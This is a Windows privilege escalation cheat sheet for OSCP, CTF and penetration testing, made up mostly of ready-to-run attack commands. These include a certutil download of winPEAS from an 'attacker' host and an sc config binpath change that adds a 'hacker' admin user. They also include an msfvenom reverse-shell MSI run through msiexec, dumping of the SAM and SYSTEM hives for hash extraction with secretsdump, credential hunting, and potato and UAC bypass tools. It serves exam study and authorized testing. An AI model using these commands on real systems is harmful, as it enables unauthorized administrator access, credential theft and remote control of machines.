# Windows Privilege Escalation Cheat Sheet
### Based on TryHackMe, HackTheBox, and OSCP Techniques

Optimized for **OSCP / GPEN / CTF / Pentesting**

---

# 1. Basic Enumeration (Always First)

## System Information

```powershell
whoami
whoami /priv
whoami /groups
hostname
systeminfo
OS Version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Network Information
ipconfig /all
route print
netstat -ano
2. Automated Enumeration Tools

Run automated tools early.

Common tools:

winPEAS

Seatbelt

PowerUp

SharpUp

Watson

Windows Exploit Suggester

Example:

winPEAS.exe

Upload example:

python3 -m http.server 8000

Download on target:

certutil -urlcache -f http://attacker/winpeas.exe winpeas.exe
3. User Enumeration
net user
net user username

List administrators:

net localgroup administrators

Current user:

whoami
4. Check Privileges
whoami /priv

Important privileges:

SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege

If you see SeImpersonatePrivilege, you may use:

JuicyPotato

PrintSpoofer

RoguePotato

Example:

PrintSpoofer.exe -i -c cmd
5. Unquoted Service Paths

List services:

wmic service get name,displayname,pathname,startmode

Look for:

C:\Program Files\Some Service\service.exe

If unquoted and writable:

C:\Program.exe

Exploit by placing malicious binary.

Check permissions:

icacls "C:\Program Files\Some Service"
6. Weak Service Permissions

Find service permissions:

accesschk.exe -uwcqv "Authenticated Users" *

Check if you can modify service:

sc qc service_name

Modify service:

sc config service_name binpath= "cmd /c net user hacker password /add"

Restart service:

sc stop service_name
sc start service_name
7. AlwaysInstallElevated

Check registry:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

If both:

AlwaysInstallElevated = 1

Create malicious MSI:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi

Run:

msiexec /quiet /qn /i shell.msi
8. Stored Credentials

Search for credentials:

cmdkey /list

Use stored credentials:

runas /savecred /user:administrator cmd

Search files:

dir /s *pass* == *cred* == *vnc* == *.config*
9. Scheduled Tasks

List tasks:

schtasks /query /fo LIST /v

Check writable scripts used in tasks.

10. Registry Privilege Escalation

Check autoruns:

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

If writable path → replace binary.

11. Startup Applications

Check startup folder:

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

If writable:

Place malicious executable.

12. DLL Hijacking

If application loads missing DLL.

Tools:

Procmon

winPEAS

Steps:

Identify missing DLL

Create malicious DLL

Place DLL in writable directory

13. Writable Services

Check service:

sc qc service_name

Check permissions:

icacls "C:\Program Files\Service"

Replace binary if writable.

14. Token Impersonation

If privilege exists:

SeImpersonatePrivilege

Use tools:

JuicyPotato
PrintSpoofer
RoguePotato
GodPotato

Example:

PrintSpoofer.exe -i -c cmd
15. Weak Folder Permissions

Find writable directories:

accesschk.exe -uws "Everyone" C:\

or

icacls C:\Program Files
16. Password Hunting

Search registry:

reg query HKLM /f password /t REG_SZ /s

Search files:

findstr /si password *.txt *.ini *.config *.xml
17. SAM and SYSTEM Extraction

If you have backup privilege:

SeBackupPrivilege

Dump SAM:

reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

Extract hashes:

secretsdump.py -sam sam.hive -system system.hive LOCAL
18. UAC Bypass

Check UAC level:

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

Common techniques:

fodhelper

eventvwr

sdclt

Example:

fodhelper.exe
19. Kernel Exploits

Check system patches:

systeminfo

Use:

Windows Exploit Suggester
Watson
Sherlock

Example exploit:

MS16-032
20. Quick PrivEsc Checklist (Exam Mode)
Step 1
whoami
whoami /priv
Step 2
systeminfo
Step 3

Run enumeration tool:

winPEAS.exe
Step 4

Check services:

wmic service get name,pathname
Step 5

Check scheduled tasks:

schtasks /query /fo LIST /v
Step 6

Check registry:

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Step 7

Search credentials:

cmdkey /list
Step 8

Check AlwaysInstallElevated:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
21. Common PrivEsc Tools
Enumeration
winPEAS
Seatbelt
PowerUp
SharpUp
Sherlock
Watson
Exploitation
JuicyPotato
PrintSpoofer
RoguePotato
GodPotato
22. Useful File Locations
C:\Windows\System32\config
C:\Program Files
C:\ProgramData
C:\Users\*\AppData
C:\Windows\Tasks
